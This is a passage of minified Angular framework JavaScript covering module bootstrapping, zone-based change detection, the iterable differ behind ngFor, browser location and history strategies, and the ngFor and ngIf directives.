  if (e) return e;
  let i = t.isStable
    .pipe(Ge((n) => n))
    .toPromise()
    .then(() => {});
  return So.set(t, i), t.onDestroy(() => So?.delete(t)), i;
}
function Xb(t, e, i) {
  (!e && !Uc(t)) || Jb(t, i, e);
}
function Uc(t) {
  return il(t);
}
function Jb(t, e, i) {
  let n;
  i ? ((n = 0), (t[I] |= 1024)) : (n = 64 & t[I] ? 0 : 1), Zp(t, e, n);
}
var $c = class {
    constructor(e, i) {
      (this.ngModuleFactory = e), (this.componentFactories = i);
    }
  },
  ks = (() => {
    let e = class e {
      compileModuleSync(n) {
        return new is(n);
      }
      compileModuleAsync(n) {
        return Promise.resolve(this.compileModuleSync(n));
      }
      compileModuleAndAllComponentsSync(n) {
        let r = this.compileModuleSync(n),
          s = yp(hh(n).declarations).reduce((a, c) => {
            let l = Bt(c);
            return l && a.push(new Xn(l)), a;
          }, []);
        return new $c(r, s);
      }
      compileModuleAndAllComponentsAsync(n) {
        return Promise.resolve(this.compileModuleAndAllComponentsSync(n));
      }
      clearCache() {}
      clearCacheFor(n) {}
      getModuleId(n) {}
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  eM = new b("");
function tM(t, e, i) {
  let n = new is(i);
  return Promise.resolve(n);
}
function Hf(t) {
  for (let e = t.length - 1; e >= 0; e--) if (void 0 !== t[e]) return t[e];
}
var nM = (() => {
  let e = class e {
    constructor() {
      (this.zone = v(O)), (this.applicationRef = v(tt));
    }
    initialize() {
      this._onMicrotaskEmptySubscription ||
        (this._onMicrotaskEmptySubscription =
          this.zone.onMicrotaskEmpty.subscribe({
            next: () => {
              this.zone.run(() => {
                this.applicationRef.tick();
              });
            },
          }));
    }
    ngOnDestroy() {
      this._onMicrotaskEmptySubscription?.unsubscribe();
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
    e
  );
})();
function iM(t) {
  return [
    { provide: O, useFactory: t },
    {
      provide: cn,
      multi: !0,
      useFactory: () => {
        let e = v(nM, { optional: !0 });
        return () => e.initialize();
      },
    },
    {
      provide: cn,
      multi: !0,
      useFactory: () => {
        let e = v(sM);
        return () => {
          e.initialize();
        };
      },
    },
    { provide: ep, useFactory: rM },
  ];
}
function rM() {
  let t = v(O),
    e = v(ut);
  return (i) => t.runOutsideAngular(() => e.handleError(i));
}
function oM(t) {
  return {
    enableLongStackTrace: !1,
    shouldCoalesceEventChangeDetection: t?.eventCoalescing ?? !1,
    shouldCoalesceRunChangeDetection: t?.runCoalescing ?? !1,
  };
}
var sM = (() => {
  let e = class e {
    constructor() {
      (this.subscription = new Y()),
        (this.initialized = !1),
        (this.zone = v(O)),
        (this.pendingTasks = v(ir));
    }
    initialize() {
      if (this.initialized) return;
      this.initialized = !0;
      let n = null;
      !this.zone.isStable &&
        !this.zone.hasPendingMacrotasks &&
        !this.zone.hasPendingMicrotasks &&
        (n = this.pendingTasks.add()),
        this.zone.runOutsideAngular(() => {
          this.subscription.add(
            this.zone.onStable.subscribe(() => {
              O.assertNotInAngularZone(),
                queueMicrotask(() => {
                  null !== n &&
                    !this.zone.hasPendingMacrotasks &&
                    !this.zone.hasPendingMicrotasks &&
                    (this.pendingTasks.remove(n), (n = null));
                });
            })
          );
        }),
        this.subscription.add(
          this.zone.onUnstable.subscribe(() => {
            O.assertInAngularZone(), (n ??= this.pendingTasks.add());
          })
        );
    }
    ngOnDestroy() {
      this.subscription.unsubscribe();
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
    e
  );
})();
function aM() {
  return (typeof $localize < "u" && $localize.locale) || os;
}
var Fs = new b("", {
    providedIn: "root",
    factory: () => v(Fs, j.Optional | j.SkipSelf) || aM(),
  }),
  vg = new b(""),
  _g = (() => {
    let e = class e {
      constructor(n) {
        (this._injector = n),
          (this._modules = []),
          (this._destroyListeners = []),
          (this._destroyed = !1);
      }
      bootstrapModuleFactory(n, r) {
        let o = Dw(
          r?.ngZone,
          oM({
            eventCoalescing: r?.ngZoneEventCoalescing,
            runCoalescing: r?.ngZoneRunCoalescing,
          })
        );
        return o.run(() => {
          let s = lb(
              n.moduleType,
              this.injector,
              iM(() => o)
            ),
            a = s.injector.get(ut, null);
          return (
            o.runOutsideAngular(() => {
              let c = o.onError.subscribe({
                next: (l) => {
                  a.handleError(l);
                },
              });
              s.onDestroy(() => {
                Fo(this._modules, s), c.unsubscribe();
              });
            }),
            Kb(a, o, () => {
              let c = s.injector.get(gg);
              return (
                c.runInitializers(),
                c.donePromise.then(
                  () => (
                    jb(s.injector.get(Fs, os) || os),
                    this._moduleDoBootstrap(s),
                    s
                  )
                )
              );
            })
          );
        });
      }
      bootstrapModule(n, r = []) {
        let o = mg({}, r);
        return tM(this.injector, o, n).then((s) =>
          this.bootstrapModuleFactory(s, o)
        );
      }
      _moduleDoBootstrap(n) {
        let r = n.injector.get(tt);
        if (n._bootstrapComponents.length > 0)
          n._bootstrapComponents.forEach((o) => r.bootstrap(o));
        else {
          if (!n.instance.ngDoBootstrap) throw new D(-403, !1);
          n.instance.ngDoBootstrap(r);
        }
        this._modules.push(n);
      }
      onDestroy(n) {
        this._destroyListeners.push(n);
      }
      get injector() {
        return this._injector;
      }
      destroy() {
        if (this._destroyed) throw new D(404, !1);
        this._modules.slice().forEach((r) => r.destroy()),
          this._destroyListeners.forEach((r) => r());
        let n = this._injector.get(vg, null);
        n && (n.forEach((r) => r()), n.clear()), (this._destroyed = !0);
      }
      get destroyed() {
        return this._destroyed;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(re));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "platform" })),
      e
    );
  })(),
  Ai = null,
  yg = new b("");
function cM(t) {
  if (Ai && !Ai.get(yg, !1)) throw new D(400, !1);
  Zb(), (Ai = t);
  let e = t.get(_g);
  return dM(t), e;
}
function jl(t, e, i = []) {
  let n = `Platform: ${e}`,
    r = new b(n);
  return (o = []) => {
    let s = Cg();
    if (!s || s.injector.get(yg, !1)) {
      let a = [...i, ...o, { provide: r, useValue: !0 }];
      t ? t(a) : cM(lM(a, n));
    }
    return uM(r);
  };
}
function lM(t = [], e) {
  return re.create({
    name: e,
    providers: [
      { provide: ds, useValue: "platform" },
      { provide: vg, useValue: new Set([() => (Ai = null)]) },
      ...t,
    ],
  });
}
function uM(t) {
  let e = Cg();
  if (!e) throw new D(401, !1);
  return e;
}
function Cg() {
  return Ai?.get(_g) ?? null;
}
function dM(t) {
  t.get(pl, null)?.forEach((i) => i());
}
var Ot = (() => {
  let e = class e {};
  return (e.__NG_ELEMENT_ID__ = fM), e;
})();
function fM(t) {
  return hM(Ve(), X(), !(16 & ~t));
}
function hM(t, e, i) {
  if (Zi(t) && !i) {
    let n = $t(t.index, e);
    return new hn(n, n);
  }
  if (47 & t.type) {
    let n = e[Fe];
    return new hn(n, e);
  }
  return null;
}
var Hc = class {
    constructor() {}
    supports(e) {
      return ag(e);
    }
    create(e) {
      return new zc(e);
    }
  },
  pM = (t, e) => e,
  zc = class {
    constructor(e) {
      (this.length = 0),
        (this._linkedRecords = null),
        (this._unlinkedRecords = null),
        (this._previousItHead = null),
        (this._itHead = null),
        (this._itTail = null),
        (this._additionsHead = null),
        (this._additionsTail = null),
        (this._movesHead = null),
        (this._movesTail = null),
        (this._removalsHead = null),
        (this._removalsTail = null),
        (this._identityChangesHead = null),
        (this._identityChangesTail = null),
        (this._trackByFn = e || pM);
    }
    forEachItem(e) {
      let i;
      for (i = this._itHead; null !== i; i = i._next) e(i);
    }
    forEachOperation(e) {
      let i = this._itHead,
        n = this._removalsHead,
        r = 0,
        o = null;
      for (; i || n; ) {
        let s = !n || (i && i.currentIndex < zf(n, r, o)) ? i : n,
          a = zf(s, r, o),
          c = s.currentIndex;
        if (s === n) r--, (n = n._nextRemoved);
        else if (((i = i._next), null == s.previousIndex)) r++;
        else {
          o || (o = []);
          let l = a - r,
            u = c - r;
          if (l != u) {
            for (let f = 0; f < l; f++) {
              let m = f < o.length ? o[f] : (o[f] = 0),
                w = m + f;
              u <= w && w < l && (o[f] = m + 1);
            }
            o[s.previousIndex] = u - l;
          }
        }
        a !== c && e(s, a, c);
      }
    }
    forEachPreviousItem(e) {
      let i;
      for (i = this._previousItHead; null !== i; i = i._nextPrevious) e(i);
    }
    forEachAddedItem(e) {
      let i;
      for (i = this._additionsHead; null !== i; i = i._nextAdded) e(i);
    }
    forEachMovedItem(e) {
      let i;
      for (i = this._movesHead; null !== i; i = i._nextMoved) e(i);
    }
    forEachRemovedItem(e) {
      let i;
      for (i = this._removalsHead; null !== i; i = i._nextRemoved) e(i);
    }
    forEachIdentityChange(e) {
      let i;
      for (i = this._identityChangesHead; null !== i; i = i._nextIdentityChange)
        e(i);
    }
    diff(e) {
      if ((null == e && (e = []), !ag(e))) throw new D(900, !1);
      return this.check(e) ? this : null;
    }
    onDestroy() {}
    check(e) {
      this._reset();
      let r,
        o,
        s,
        i = this._itHead,
        n = !1;
      if (Array.isArray(e)) {
        this.length = e.length;
        for (let a = 0; a < this.length; a++)
          (o = e[a]),
            (s = this._trackByFn(a, o)),
            null !== i && Object.is(i.trackById, s)
              ? (n && (i = this._verifyReinsertion(i, o, s, a)),
                Object.is(i.item, o) || this._addIdentityChange(i, o))
              : ((i = this._mismatch(i, o, s, a)), (n = !0)),
            (i = i._next);
      } else
        (r = 0),
          ub(e, (a) => {
            (s = this._trackByFn(r, a)),
              null !== i && Object.is(i.trackById, s)
                ? (n && (i = this._verifyReinsertion(i, a, s, r)),
                  Object.is(i.item, a) || this._addIdentityChange(i, a))
                : ((i = this._mismatch(i, a, s, r)), (n = !0)),
              (i = i._next),
              r++;
          }),
          (this.length = r);
      return this._truncate(i), (this.collection = e), this.isDirty;
    }
    get isDirty() {
      return (
        null !== this._additionsHead ||
        null !== this._movesHead ||
        null !== this._removalsHead ||
        null !== this._identityChangesHead
      );
    }
    _reset() {
      if (this.isDirty) {
        let e;
        for (e = this._previousItHead = this._itHead; null !== e; e = e._next)
          e._nextPrevious = e._next;
        for (e = this._additionsHead; null !== e; e = e._nextAdded)
          e.previousIndex = e.currentIndex;
        for (
          this._additionsHead = this._additionsTail = null, e = this._movesHead;
          null !== e;
          e = e._nextMoved
        )
          e.previousIndex = e.currentIndex;
        (this._movesHead = this._movesTail = null),
          (this._removalsHead = this._removalsTail = null),
          (this._identityChangesHead = this._identityChangesTail = null);
      }
    }
    _mismatch(e, i, n, r) {
      let o;
      return (
        null === e ? (o = this._itTail) : ((o = e._prev), this._remove(e)),
        null !==
        (e =
          null === this._unlinkedRecords
            ? null
            : this._unlinkedRecords.get(n, null))
          ? (Object.is(e.item, i) || this._addIdentityChange(e, i),
            this._reinsertAfter(e, o, r))
          : null !==
            (e =
              null === this._linkedRecords
                ? null
                : this._linkedRecords.get(n, r))
          ? (Object.is(e.item, i) || this._addIdentityChange(e, i),
            this._moveAfter(e, o, r))
          : (e = this._addAfter(new Wc(i, n), o, r)),
        e
      );
    }
    _verifyReinsertion(e, i, n, r) {
      let o =
        null === this._unlinkedRecords
          ? null
          : this._unlinkedRecords.get(n, null);
      return (
        null !== o
          ? (e = this._reinsertAfter(o, e._prev, r))
          : e.currentIndex != r &&
            ((e.currentIndex = r), this._addToMoves(e, r)),
        e
      );
    }
    _truncate(e) {
      for (; null !== e; ) {
        let i = e._next;
        this._addToRemovals(this._unlink(e)), (e = i);
      }
      null !== this._unlinkedRecords && this._unlinkedRecords.clear(),
        null !== this._additionsTail && (this._additionsTail._nextAdded = null),
        null !== this._movesTail && (this._movesTail._nextMoved = null),
        null !== this._itTail && (this._itTail._next = null),
        null !== this._removalsTail && (this._removalsTail._nextRemoved = null),
        null !== this._identityChangesTail &&
          (this._identityChangesTail._nextIdentityChange = null);
    }
    _reinsertAfter(e, i, n) {
      null !== this._unlinkedRecords && this._unlinkedRecords.remove(e);
      let r = e._prevRemoved,
        o = e._nextRemoved;
      return (
        null === r ? (this._removalsHead = o) : (r._nextRemoved = o),
        null === o ? (this._removalsTail = r) : (o._prevRemoved = r),
        this._insertAfter(e, i, n),
        this._addToMoves(e, n),
        e
      );
    }
    _moveAfter(e, i, n) {
      return (
        this._unlink(e), this._insertAfter(e, i, n), this._addToMoves(e, n), e
      );
    }
    _addAfter(e, i, n) {
      return (
        this._insertAfter(e, i, n),
        null === this._additionsTail
          ? (this._additionsTail = this._additionsHead = e)
          : (this._additionsTail = this._additionsTail._nextAdded = e),
        e
      );
    }
    _insertAfter(e, i, n) {
      let r = null === i ? this._itHead : i._next;
      return (
        (e._next = r),
        (e._prev = i),
        null === r ? (this._itTail = e) : (r._prev = e),
        null === i ? (this._itHead = e) : (i._next = e),
        null === this._linkedRecords && (this._linkedRecords = new ss()),
        this._linkedRecords.put(e),
        (e.currentIndex = n),
        e
      );
    }
    _remove(e) {
      return this._addToRemovals(this._unlink(e));
    }
    _unlink(e) {
      null !== this._linkedRecords && this._linkedRecords.remove(e);
      let i = e._prev,
        n = e._next;
      return (
        null === i ? (this._itHead = n) : (i._next = n),
        null === n ? (this._itTail = i) : (n._prev = i),
        e
      );
    }
    _addToMoves(e, i) {
      return (
        e.previousIndex === i ||
          (null === this._movesTail
            ? (this._movesTail = this._movesHead = e)
            : (this._movesTail = this._movesTail._nextMoved = e)),
        e
      );
    }
    _addToRemovals(e) {
      return (
        null === this._unlinkedRecords && (this._unlinkedRecords = new ss()),
        this._unlinkedRecords.put(e),
        (e.currentIndex = null),
        (e._nextRemoved = null),
        null === this._removalsTail
          ? ((this._removalsTail = this._removalsHead = e),
            (e._prevRemoved = null))
          : ((e._prevRemoved = this._removalsTail),
            (this._removalsTail = this._removalsTail._nextRemoved = e)),
        e
      );
    }
    _addIdentityChange(e, i) {
      return (
        (e.item = i),
        null === this._identityChangesTail
          ? (this._identityChangesTail = this._identityChangesHead = e)
          : (this._identityChangesTail =
              this._identityChangesTail._nextIdentityChange =
                e),
        e
      );
    }
  },
  Wc = class {
    constructor(e, i) {
      (this.item = e),
        (this.trackById = i),
        (this.currentIndex = null),
        (this.previousIndex = null),
        (this._nextPrevious = null),
        (this._prev = null),
        (this._next = null),
        (this._prevDup = null),
        (this._nextDup = null),
        (this._prevRemoved = null),
        (this._nextRemoved = null),
        (this._nextAdded = null),
        (this._nextMoved = null),
        (this._nextIdentityChange = null);
    }
  },
  Gc = class {
    constructor() {
      (this._head = null), (this._tail = null);
    }
    add(e) {
      null === this._head
        ? ((this._head = this._tail = e),
          (e._nextDup = null),
          (e._prevDup = null))
        : ((this._tail._nextDup = e),
          (e._prevDup = this._tail),
          (e._nextDup = null),
          (this._tail = e));
    }
    get(e, i) {
      let n;
      for (n = this._head; null !== n; n = n._nextDup)
        if ((null === i || i <= n.currentIndex) && Object.is(n.trackById, e))
          return n;
      return null;
    }
    remove(e) {
      let i = e._prevDup,
        n = e._nextDup;
      return (
        null === i ? (this._head = n) : (i._nextDup = n),
        null === n ? (this._tail = i) : (n._prevDup = i),
        null === this._head
      );
    }
  },
  ss = class {
    constructor() {
      this.map = new Map();
    }
    put(e) {
      let i = e.trackById,
        n = this.map.get(i);
      n || ((n = new Gc()), this.map.set(i, n)), n.add(e);
    }
    get(e, i) {
      let n = e,
        r = this.map.get(n);
      return r ? r.get(e, i) : null;
    }
    remove(e) {
      let i = e.trackById;
      return this.map.get(i).remove(e) && this.map.delete(i), e;
    }
    get isEmpty() {
      return 0 === this.map.size;
    }
    clear() {
      this.map.clear();
    }
  };
function zf(t, e, i) {
  let n = t.previousIndex;
  if (null === n) return n;
  let r = 0;
  return i && n < i.length && (r = i[n]), n + e + r;
}
function Wf() {
  return new Ls([new Hc()]);
}
var Ls = (() => {
    let e = class e {
      constructor(n) {
        this.factories = n;
      }
      static create(n, r) {
        if (null != r) {
          let o = r.factories.slice();
          n = n.concat(o);
        }
        return new e(n);
      }
      static extend(n) {
        return {
          provide: e,
          useFactory: (r) => e.create(n, r || Wf()),
          deps: [[e, new Zc(), new us()]],
        };
      }
      find(n) {
        let r = this.factories.find((o) => o.supports(n));
        if (null != r) return r;
        throw new D(901, !1);
      }
    };
    return (e.ɵprov = y({ token: e, providedIn: "root", factory: Wf })), e;
  })(),
  wg = jl(null, "core", []),
  bg = (() => {
    let e = class e {
      constructor(n) {}
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(tt));
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({})),
      e
    );
  })(),
  Gf = !1,
  gM = !1;
function mM() {
  Gf || ((Gf = !0), AC(), Rb(), Wb(), Fb(), pb(), Bw(), pw(), y0(), Ub());
}
function vM(t, e) {
  return Ll(t);
}
function Mg() {
  return qi([
    {
      provide: xo,
      useFactory: () => {
        let t = !0;
        return (
          Si() && (t = !!v(gn, { optional: !0 })?.get(dp, null)),
          t && si("NgHydration"),
          t
        );
      },
    },
    {
      provide: cn,
      useValue: () => {
        (gM = !!v(LC, { optional: !0 })), Si() && v(xo) && (_M(), mM());
      },
      multi: !0,
    },
    { provide: gp, useFactory: () => Si() && v(xo) },
    {
      provide: ai,
      useFactory: () => {
        if (Si() && v(xo)) {
          let t = v(tt),
            e = v(re);
          return () => {
            vM(t, e).then(() => {
              ow(t);
            });
          };
        }
        return () => {};
      },
      multi: !0,
    },
  ]);
}
function _M() {
  let e,
    t = hs();
  for (let i of t.body.childNodes)
    if (i.nodeType === Node.COMMENT_NODE && i.textContent?.trim() === SC) {
      e = i;
      break;
    }
  if (!e) throw new D(-507, !1);
}
function Yt(t) {
  return "boolean" == typeof t ? t : null != t && "false" !== t;
}
function Dg(t) {
  let e = Bt(t);
  if (!e) return null;
  let i = new Xn(e);
  return {
    get selector() {
      return i.selector;
    },
    get type() {
      return i.componentType;
    },
    get inputs() {
      return i.inputs;
    },
    get outputs() {
      return i.outputs;
    },
    get ngContentSelectors() {
      return i.ngContentSelectors;
    },
    get isStandalone() {
      return e.standalone;
    },
    get isSignal() {
      return e.signals;
    },
  };
}
var Pg = null;
function vn() {
  return Pg;
}
function Sg(t) {
  Pg ??= t;
}
var js = class {},
  T = new b(""),
  zl = (() => {
    let e = class e {
      historyGo(n) {
        throw new Error("");
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => v(CM), providedIn: "platform" })),
      e
    );
  })(),
  Tg = new b(""),
  CM = (() => {
    let e = class e extends zl {
      constructor() {
        super(),
          (this._doc = v(T)),
          (this._location = window.location),
          (this._history = window.history);
      }
      getBaseHrefFromDOM() {
        return vn().getBaseHref(this._doc);
      }
      onPopState(n) {
        let r = vn().getGlobalEventTarget(this._doc, "window");
        return (
          r.addEventListener("popstate", n, !1),
          () => r.removeEventListener("popstate", n)
        );
      }
      onHashChange(n) {
        let r = vn().getGlobalEventTarget(this._doc, "window");
        return (
          r.addEventListener("hashchange", n, !1),
          () => r.removeEventListener("hashchange", n)
        );
      }
      get href() {
        return this._location.href;
      }
      get protocol() {
        return this._location.protocol;
      }
      get hostname() {
        return this._location.hostname;
      }
      get port() {
        return this._location.port;
      }
      get pathname() {
        return this._location.pathname;
      }
      get search() {
        return this._location.search;
      }
      get hash() {
        return this._location.hash;
      }
      set pathname(n) {
        this._location.pathname = n;
      }
      pushState(n, r, o) {
        this._history.pushState(n, r, o);
      }
      replaceState(n, r, o) {
        this._history.replaceState(n, r, o);
      }
      forward() {
        this._history.forward();
      }
      back() {
        this._history.back();
      }
      historyGo(n = 0) {
        this._history.go(n);
      }
      getState() {
        return this._history.state;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({
        token: e,
        factory: () => new e(),
        providedIn: "platform",
      })),
      e
    );
  })();
function Wl(t, e) {
  if (0 == t.length) return e;
  if (0 == e.length) return t;
  let i = 0;
  return (
    t.endsWith("/") && i++,
    e.startsWith("/") && i++,
    2 == i ? t + e.substring(1) : 1 == i ? t + e : t + "/" + e
  );
}
function xg(t) {
  let e = t.match(/#|\?|$/),
    i = (e && e.index) || t.length,
    n = i - ("/" === t[i - 1] ? 1 : 0);
  return t.slice(0, n) + t.slice(i);
}
function It(t) {
  return t && "?" !== t[0] ? "?" + t : t;
}
var Pt = (() => {
    let e = class e {
      historyGo(n) {
        throw new Error("");
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => v(Gl), providedIn: "root" })),
      e
    );
  })(),
  Ag = new b(""),
  Gl = (() => {
    let e = class e extends Pt {
      constructor(n, r) {
        super(),
          (this._platformLocation = n),
          (this._removeListenerFns = []),
          (this._baseHref =
            r ??
            this._platformLocation.getBaseHrefFromDOM() ??
            v(T).location?.origin ??
            "");
      }
      ngOnDestroy() {
        for (; this._removeListenerFns.length; )
          this._removeListenerFns.pop()();
      }
      onPopState(n) {
        this._removeListenerFns.push(
          this._platformLocation.onPopState(n),
          this._platformLocation.onHashChange(n)
        );
      }
      getBaseHref() {
        return this._baseHref;
      }
      prepareExternalUrl(n) {
        return Wl(this._baseHref, n);
      }
      path(n = !1) {
        let r =
            this._platformLocation.pathname + It(this._platformLocation.search),
          o = this._platformLocation.hash;
        return o && n ? `${r}${o}` : r;
      }
      pushState(n, r, o, s) {
        let a = this.prepareExternalUrl(o + It(s));
        this._platformLocation.pushState(n, r, a);
      }
      replaceState(n, r, o, s) {
        let a = this.prepareExternalUrl(o + It(s));
        this._platformLocation.replaceState(n, r, a);
      }
      forward() {
        this._platformLocation.forward();
      }
      back() {
        this._platformLocation.back();
      }
      getState() {
        return this._platformLocation.getState();
      }
      historyGo(n = 0) {
        this._platformLocation.historyGo?.(n);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(zl), h(Ag, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Rg = (() => {
    let e = class e extends Pt {
      constructor(n, r) {
        super(),
          (this._platformLocation = n),
          (this._baseHref = ""),
          (this._removeListenerFns = []),
          null != r && (this._baseHref = r);
      }
      ngOnDestroy() {
        for (; this._removeListenerFns.length; )
          this._removeListenerFns.pop()();
      }
      onPopState(n) {
        this._removeListenerFns.push(
          this._platformLocation.onPopState(n),
          this._platformLocation.onHashChange(n)
        );
      }
      getBaseHref() {
        return this._baseHref;
      }
      path(n = !1) {
        let r = this._platformLocation.hash ?? "#";
        return r.length > 0 ? r.substring(1) : r;
      }
      prepareExternalUrl(n) {
        let r = Wl(this._baseHref, n);
        return r.length > 0 ? "#" + r : r;
      }
      pushState(n, r, o, s) {
        let a = this.prepareExternalUrl(o + It(s));
        0 == a.length && (a = this._platformLocation.pathname),
          this._platformLocation.pushState(n, r, a);
      }
      replaceState(n, r, o, s) {
        let a = this.prepareExternalUrl(o + It(s));
        0 == a.length && (a = this._platformLocation.pathname),
          this._platformLocation.replaceState(n, r, a);
      }
      forward() {
        this._platformLocation.forward();
      }
      back() {
        this._platformLocation.back();
      }
      getState() {
        return this._platformLocation.getState();
      }
      historyGo(n = 0) {
        this._platformLocation.historyGo?.(n);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(zl), h(Ag, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  pt = (() => {
    let e = class e {
      constructor(n) {
        (this._subject = new K()),
          (this._urlChangeListeners = []),
          (this._urlChangeSubscription = null),
          (this._locationStrategy = n);
        let r = this._locationStrategy.getBaseHref();
        (this._basePath = MM(xg(Eg(r)))),
          this._locationStrategy.onPopState((o) => {
            this._subject.emit({
              url: this.path(!0),
              pop: !0,
              state: o.state,
              type: o.type,
            });
          });
      }
      ngOnDestroy() {
        this._urlChangeSubscription?.unsubscribe(),
          (this._urlChangeListeners = []);
      }
      path(n = !1) {
        return this.normalize(this._locationStrategy.path(n));
      }
      getState() {
        return this._locationStrategy.getState();
      }
      isCurrentPathEqualTo(n, r = "") {
        return this.path() == this.normalize(n + It(r));
      }
      normalize(n) {
        return e.stripTrailingSlash(bM(this._basePath, Eg(n)));
      }
      prepareExternalUrl(n) {
        return (
          n && "/" !== n[0] && (n = "/" + n),
          this._locationStrategy.prepareExternalUrl(n)
        );
      }
      go(n, r = "", o = null) {
        this._locationStrategy.pushState(o, "", n, r),
          this._notifyUrlChangeListeners(this.prepareExternalUrl(n + It(r)), o);
      }
      replaceState(n, r = "", o = null) {
        this._locationStrategy.replaceState(o, "", n, r),
          this._notifyUrlChangeListeners(this.prepareExternalUrl(n + It(r)), o);
      }
      forward() {
        this._locationStrategy.forward();
      }
      back() {
        this._locationStrategy.back();
      }
      historyGo(n = 0) {
        this._locationStrategy.historyGo?.(n);
      }
      onUrlChange(n) {
        return (
          this._urlChangeListeners.push(n),
          (this._urlChangeSubscription ??= this.subscribe((r) => {
            this._notifyUrlChangeListeners(r.url, r.state);
          })),
          () => {
            let r = this._urlChangeListeners.indexOf(n);
            this._urlChangeListeners.splice(r, 1),
              0 === this._urlChangeListeners.length &&
                (this._urlChangeSubscription?.unsubscribe(),
                (this._urlChangeSubscription = null));
          }
        );
      }
      _notifyUrlChangeListeners(n = "", r) {
        this._urlChangeListeners.forEach((o) => o(n, r));
      }
      subscribe(n, r, o) {
        return this._subject.subscribe({ next: n, error: r, complete: o });
      }
    };
    return (
      (e.normalizeQueryParams = It),
      (e.joinWithSlash = Wl),
      (e.stripTrailingSlash = xg),
      (e.ɵfac = function (r) {
        return new (r || e)(h(Pt));
      }),
      (e.ɵprov = y({ token: e, factory: () => wM(), providedIn: "root" })),
      e
    );
  })();
function wM() {
  return new pt(h(Pt));
}
function bM(t, e) {
  if (!t || !e.startsWith(t)) return e;
  let i = e.substring(t.length);
  return "" === i || ["/", ";", "?", "#"].includes(i[0]) ? i : e;
}
function Eg(t) {
  return t.replace(/\/index.html$/, "");
}
function MM(t) {
  if (new RegExp("^(https?:)?//").test(t)) {
    let [, i] = t.split(/\/\/[^\/]+/);
    return i;
  }
  return t;
}
function ql(t, e) {
  e = encodeURIComponent(e);
  for (let i of t.split(";")) {
    let n = i.indexOf("="),
      [r, o] = -1 == n ? [i, ""] : [i.slice(0, n), i.slice(n + 1)];
    if (r.trim() === e) return decodeURIComponent(o);
  }
  return null;
}
var Vl = class {
    constructor(e, i, n, r) {
      (this.$implicit = e),
        (this.ngForOf = i),
        (this.index = n),
        (this.count = r);
    }
    get first() {
      return 0 === this.index;
    }
    get last() {
      return this.index === this.count - 1;
    }
    get even() {
      return this.index % 2 == 0;
    }
    get odd() {
      return !this.even;
    }
  },
  Ng = (() => {
    let e = class e {
      set ngForOf(n) {
        (this._ngForOf = n), (this._ngForOfDirty = !0);
      }
      set ngForTrackBy(n) {
        this._trackByFn = n;
      }
      get ngForTrackBy() {
        return this._trackByFn;
      }
      constructor(n, r, o) {
        (this._viewContainer = n),
          (this._template = r),
          (this._differs = o),
          (this._ngForOf = null),
          (this._ngForOfDirty = !0),
          (this._differ = null);
      }
      set ngForTemplate(n) {
        n && (this._template = n);
      }
      ngDoCheck() {
        if (this._ngForOfDirty) {
          this._ngForOfDirty = !1;
          let n = this._ngForOf;
          !this._differ &&
            n &&
            (this._differ = this._differs.find(n).create(this.ngForTrackBy));
        }
        if (this._differ) {
          let n = this._differ.diff(this._ngForOf);
          n && this._applyChanges(n);
        }
      }
      _applyChanges(n) {
        let r = this._viewContainer;
        n.forEachOperation((o, s, a) => {
          if (null == o.previousIndex)
            r.createEmbeddedView(
              this._template,
              new Vl(o.item, this._ngForOf, -1, -1),
              null === a ? void 0 : a
            );
          else if (null == a) r.remove(null === s ? void 0 : s);
          else if (null !== s) {
            let c = r.get(s);
            r.move(c, a), Og(c, o);
          }
        });
        for (let o = 0, s = r.length; o < s; o++) {
          let c = r.get(o).context;
          (c.index = o), (c.count = s), (c.ngForOf = this._ngForOf);
        }
        n.forEachIdentityChange((o) => {
          Og(r.get(o.currentIndex), o);
        });
      }
      static ngTemplateContextGuard(n, r) {
        return !0;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(P(Ue), P(Le), P(Ls));
      }),
      (e.ɵdir = be({
        type: e,
        selectors: [["", "ngFor", "", "ngForOf", ""]],
        inputs: {
          ngForOf: "ngForOf",
          ngForTrackBy: "ngForTrackBy",
          ngForTemplate: "ngForTemplate",
        },
        standalone: !0,
      })),
      e
    );
  })();
function Og(t, e) {
  t.context.$implicit = e.item;
}
var kg = (() => {
    let e = class e {
      constructor(n, r) {
        (this._viewContainer = n),
          (this._context = new Bl()),
          (this._thenTemplateRef = null),
          (this._elseTemplateRef = null),
          (this._thenViewRef = null),
          (this._elseViewRef = null),
          (this._thenTemplateRef = r);
      }
      set ngIf(n) {
        (this._context.$implicit = this._context.ngIf = n), this._updateView();
      }
      set ngIfThen(n) {
        Ig("ngIfThen", n),
          (this._thenTemplateRef = n),
          (this._thenViewRef = null),
          this._updateView();
      }
      set ngIfElse(n) {
        Ig("ngIfElse", n),
          (this._elseTemplateRef = n),
          (this._elseViewRef = null),
          this._updateView();
      }
      _updateView() {
        this._context.$implicit
          ? this._thenViewRef ||
            (this._viewContainer.clear(),
            (this._elseViewRef = null),
            this._thenTemplateRef &&
              (this._thenViewRef = this._viewContainer.createEmbeddedView(
                this._thenTemplateRef,
                this._context
              )))
          : this._elseViewRef ||
            (this._viewContainer.clear(),
            (this._thenViewRef = null),
            this._elseTemplateRef &&
              (this._elseViewRef = this._viewContainer.createEmbeddedView(
